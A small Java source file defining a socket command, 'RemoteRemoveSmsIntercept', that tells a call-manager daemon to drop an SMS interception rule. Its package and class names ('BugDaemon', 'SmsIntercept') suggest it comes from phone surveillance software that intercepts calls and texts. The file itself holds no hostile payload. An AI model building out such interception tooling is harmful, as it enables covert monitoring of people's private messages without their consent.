package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.SmsInterceptInfo;

public class RemoteRemoveSmsIntercept extends SocketCmd<SmsInterceptInfo, Boolean> {
	
	private static final long serialVersionUID = 5677132510122180774L;
	
	private static final String TAG = "RemoteRemoveSmsIntercept";
	private static final String SERVER_NAME = BugDaemonResource.CallMgr.SOCKET_NAME;

	public RemoteRemoveSmsIntercept(SmsInterceptInfo smsIntercept) {
		super(smsIntercept, Boolean.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}

}
